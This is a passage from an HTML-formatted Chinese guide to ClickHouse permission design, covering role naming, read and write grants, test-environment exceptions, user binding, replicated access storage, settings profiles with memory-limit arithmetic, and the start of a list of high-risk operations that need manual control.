-- 以 ops_user 身份登录后执行
-- SELECT * FROM system.grants WHERE user_name = current_user();
-- 管理员账号下查看该角色链条
-- SELECT * FROM system.grants WHERE role_name = &amp;#39;admin_role&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 class="heading-element" id="9-业务角色设计核心"&gt;&lt;span&gt;9. 业务角色设计（核心）&lt;/span&gt;
 &lt;a href="#9-%e4%b8%9a%e5%8a%a1%e8%a7%92%e8%89%b2%e8%ae%be%e8%ae%a1%e6%a0%b8%e5%bf%83" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h1&gt;&lt;p&gt;命名规范应该遵循 &lt;code&gt;&amp;lt;database&amp;gt;_(read|write|admin)&lt;/code&gt; 的格式，例如 &lt;code&gt;dbtest_read&lt;/code&gt;、&lt;code&gt;dbtest_write&lt;/code&gt;、&lt;code&gt;dbtest_admin&lt;/code&gt;。这样命名可以清晰地表示角色的用途和所属的数据库。&lt;/p&gt;
&lt;h2 class="heading-element" id="91-标准业务库角色"&gt;&lt;span&gt;9.1 标准业务库角色&lt;/span&gt;
 &lt;a href="#91-%e6%a0%87%e5%87%86%e4%b8%9a%e5%8a%a1%e5%ba%93%e8%a7%92%e8%89%b2" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;-- 只读角色
CREATE ROLE dbtest_read;
GRANT SELECT ON dbtest.* TO dbtest_read;

-- 可写角色
CREATE ROLE dbtest_write;
GRANT SELECT, INSERT ON dbtest.* TO dbtest_write;&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h2 class="heading-element" id="92-为什么生产程序用户不授予-update--delete"&gt;&lt;span&gt;9.2 为什么生产程序用户不授予 UPDATE / DELETE？&lt;/span&gt;
 &lt;a href="#92-%e4%b8%ba%e4%bb%80%e4%b9%88%e7%94%9f%e4%ba%a7%e7%a8%8b%e5%ba%8f%e7%94%a8%e6%88%b7%e4%b8%8d%e6%8e%88%e4%ba%88-update--delete" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;根本原因
&lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th&gt;数据库&lt;/th&gt;
 &lt;th&gt;UPDATE / DELETE&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;MySQL / PostgreSQL&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;原生能力&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;ClickHouse&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;高成本模拟&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;ClickHouse&lt;/code&gt; 的 &lt;code&gt;DELETE&lt;/code&gt; / &lt;code&gt;UPDATE&lt;/code&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;本质是数据重写&lt;/li&gt;
&lt;li&gt;&lt;code&gt;高 IO&lt;/code&gt; / &lt;code&gt;高 CPU &lt;/code&gt;&lt;/li&gt;
&lt;li&gt;容易引发 &lt;code&gt;merge&lt;/code&gt; 堆积&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;📌 &lt;strong&gt;行业共识：生产程序不直接删改&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 class="heading-element" id="93-推荐替代方式"&gt;&lt;span&gt;9.3 推荐替代方式&lt;/span&gt;
 &lt;a href="#93-%e6%8e%a8%e8%8d%90%e6%9b%bf%e4%bb%a3%e6%96%b9%e5%bc%8f" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th&gt;场景&lt;/th&gt;
 &lt;th&gt;推荐&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
 &lt;td&gt;数据过期&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;TTL&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;大批量删除&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;DROP PARTITION&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;修正数据&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;重算 + INSERT&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;极少纠错&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;运维 ALTER&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
&lt;/table&gt;
&lt;hr&gt;
&lt;h1 class="heading-element" id="10-测试环境权限例外规则"&gt;&lt;span&gt;10. 测试环境权限（例外规则）&lt;/span&gt;
 &lt;a href="#10-%e6%b5%8b%e8%af%95%e7%8e%af%e5%a2%83%e6%9d%83%e9%99%90%e4%be%8b%e5%a4%96%e8%a7%84%e5%88%99" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;GRANT SELECT, INSERT, UPDATE, DELETE ON test_dbtest.* TO test_app_role;
-- GRANT ALL ON test_dbtest.* TO test_app_role;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;必须明确：仅限测试环境&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 class="heading-element" id="11-用户绑定规范"&gt;&lt;span&gt;11. 用户绑定规范&lt;/span&gt;
 &lt;a href="#11-%e7%94%a8%e6%88%b7%e7%bb%91%e5%ae%9a%e8%a7%84%e8%8c%83" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;-- 创建用户
-- 注意: 用户、授权、访问控制都可以通过配置文件 users.xml 进行配置，节点扩展时候，该项是不会进行同步的，需要手动同步
-- 但可以通过 开启权限信息的 ZooKeeper 存储（Replicated Access），实现权限的同步（TODO: 此项未测试）
CREATE USER app_user ON CLUSTER default_cluster IDENTIFIED BY &amp;#39;StrongPassword&amp;#39;;

-- 授权角色给用户, 多个角色逗号隔开 
GRANT dbtest_write TO app_user;

-- 角色授权还有一种为角色继承机制,比如下面的是 ops_role 继承 admin_role 的权限，继承的机制是合并(TODO: 未测试此项)
-- GRANT admin_role TO ops_role ON CLUSTER default_cluster;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="111-禁止使用-default-用户"&gt;&lt;span&gt;11.1 禁止使用 default 用户&lt;/span&gt;
 &lt;a href="#111-%e7%a6%81%e6%ad%a2%e4%bd%bf%e7%94%a8-default-%e7%94%a8%e6%88%b7" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;ALTER USER default SETTINGS readonly = 1;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="112-限制角色用户的登陆来源"&gt;&lt;span&gt;11.2 限制角色/用户的登陆来源&lt;/span&gt;
 &lt;a href="#112-%e9%99%90%e5%88%b6%e8%a7%92%e8%89%b2%e7%94%a8%e6%88%b7%e7%9a%84%e7%99%bb%e9%99%86%e6%9d%a5%e6%ba%90" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;-- TODO: 此项待完善&lt;/code&gt;&lt;/pre&gt;&lt;h1 class="heading-element" id="12-用户权限同步"&gt;&lt;span&gt;12. 用户权限同步&lt;/span&gt;
 &lt;a href="#12-%e7%94%a8%e6%88%b7%e6%9d%83%e9%99%90%e5%90%8c%e6%ad%a5" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h1&gt;&lt;h2 class="heading-element" id="121-传统模式"&gt;&lt;span&gt;12.1 传统模式&lt;/span&gt;
 &lt;a href="#121-%e4%bc%a0%e7%bb%9f%e6%a8%a1%e5%bc%8f" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;权限信息存在本地 &lt;code&gt;.sql&lt;/code&gt; 文件中, 一般位于 &lt;code&gt;/var/lib/clickhouse/access&lt;/code&gt; 中&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="122-同步模式"&gt;&lt;span&gt;12.2 同步模式&lt;/span&gt;
 &lt;a href="#122-%e5%90%8c%e6%ad%a5%e6%a8%a1%e5%bc%8f" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;&lt;em&gt;当你在集群任何一个节点执行 &lt;code&gt;CREATE USER ... ON CLUSTER&lt;/code&gt; 时，该操作会被记录到 &lt;code&gt;Keeper&lt;/code&gt;。其他节点监听该路径，一旦有变动，会自动将权限信息拉取到本地内存生效。&lt;/em&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;权限信息以&lt;strong&gt;元数据形式&lt;/strong&gt;存放在 &lt;code&gt;Keeper/ZooKeeper&lt;/code&gt; 的指定路径下。&lt;/li&gt;
&lt;li&gt;核心配置
&lt;pre&gt;&lt;code&gt;&amp;lt;!-- /etc/clickhouse-server/config.d/replicated_access.xml --&amp;gt;
&amp;lt;clickhouse&amp;gt;
 &amp;lt;user_directories replace=&amp;#34;replace&amp;#34;&amp;gt;
 &amp;lt;!-- 主存储：ZooKeeper --&amp;gt;
 &amp;lt;replicated&amp;gt;
 &amp;lt;zookeeper_path&amp;gt;/clickhouse/access/&amp;lt;/zookeeper_path&amp;gt;
 &amp;lt;/replicated&amp;gt;
 &amp;lt;!-- 本地缓存 &amp;amp; 容灾 --&amp;gt;
 &amp;lt;local_directory&amp;gt;
 &amp;lt;path&amp;gt;/data/_clickhouse/access/&amp;lt;/path&amp;gt;
 &amp;lt;/local_directory&amp;gt;

 &amp;lt;users_xml&amp;gt;
 &amp;lt;path&amp;gt;users.xml&amp;lt;/path&amp;gt;
 &amp;lt;/users_xml&amp;gt;
 &amp;lt;/user_directories&amp;gt;
&amp;lt;/clickhouse&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;验证
&lt;pre&gt;&lt;code&gt;-- 主节点创建后，新加入的节点即可查看
SHOW USERS;
SHOW ROLES;

-- 查看当前节点正在使用的用户目录
SELECT name,type,params FROM system.user_directories&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;若为发现权限同步，可能是角色创建在同步模式之前&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h1 class="heading-element" id="13-settings-profile权限设计的重要补充"&gt;&lt;span&gt;13. Settings Profile（权限设计的重要补充）&lt;/span&gt;
 &lt;a href="#13-settings-profile%e6%9d%83%e9%99%90%e8%ae%be%e8%ae%a1%e7%9a%84%e9%87%8d%e8%a6%81%e8%a1%a5%e5%85%85" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h1&gt;&lt;h2 class="heading-element" id="131-为什么-settings-是权限的一部分"&gt;&lt;span&gt;13.1 为什么 settings 是权限的一部分？&lt;/span&gt;
 &lt;a href="#131-%e4%b8%ba%e4%bb%80%e4%b9%88-settings-%e6%98%af%e6%9d%83%e9%99%90%e7%9a%84%e4%b8%80%e9%83%a8%e5%88%86" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;在 &lt;code&gt;ClickHouse&lt;/code&gt; 中：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;资源滥用比权限越权更常见&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2 class="heading-element" id="132-程序用户推荐限制"&gt;&lt;span&gt;13.2 程序用户推荐限制&lt;/span&gt;
 &lt;a href="#132-%e7%a8%8b%e5%ba%8f%e7%94%a8%e6%88%b7%e6%8e%a8%e8%8d%90%e9%99%90%e5%88%b6" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;-- 创建一个资源限制模板
CREATE SETTINGS PROFILE high_priority ON CLUSTER default_cluster 
SETTINGS 
 -- 此项计算 (系统总内存 / 最大查询并发数 ) x 每个查询的内存比例因子(通常设定为 0.05 至 0.2（即每个查询使用系统总内存的 5% 至 20%）)
 max_memory_usage = 8G, 
 -- 通常建议与cpu核心数保持一致 
 max_threads = 8, 
 max_execution_time = 30,
 read_overflow_mode = &amp;#39;throw&amp;#39;;

-- 绑定给用户
ALTER USER readonly_user ON CLUSTER default_cluster SETTINGS PROFILE high_priority;

-- 例子分析
-- -- 假设系统总内存为 64GB，并且预计最多同时执行 20 个查询，每个查询使用 4 个线程：
-- 每个查询的内存使用量：
-- -- max_memory_usage_per_query = (64GB / 20) * 0.1 = 0.32GB
-- 每个查询使用 4 个线程时，内存使用量为：
-- -- max_memory_usage_per_query_with_threads = 0.32GB * 4 = 1.28GB
-- 这样，如果你同时执行 20 个查询，每个查询使用最多 1.28GB 内存，那么总内存使用量为：
-- TotalMemoryUsage = 1.28GB * 20 = 25.6GB

-- 如果你的服务器总内存为 64GB，那么该配置是合理的，因为最大查询总内存使用量仅为 25.6GB，远低于系统的总内存。&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 class="heading-element" id="14-高风险操作清单必须人工控制"&gt;&lt;span&gt;14. 高风险操作清单（必须人工控制）&lt;/span&gt;
 &lt;a href="#14-%e9%ab%98%e9%a3%8e%e9%99%a9%e6%93%8d%e4%bd%9c%e6%b8%85%e5%8d%95%e5%bf%85%e9%a1%bb%e4%ba%ba%e5%b7%a5%e6%8e%a7%e5%88%b6" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h1&gt;&lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th&gt;操作&lt;/th&gt;
 &lt;th&gt;原因&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;DROP TABLE&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;不可逆&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;TRUNCATE&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;数据瞬间丢失&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
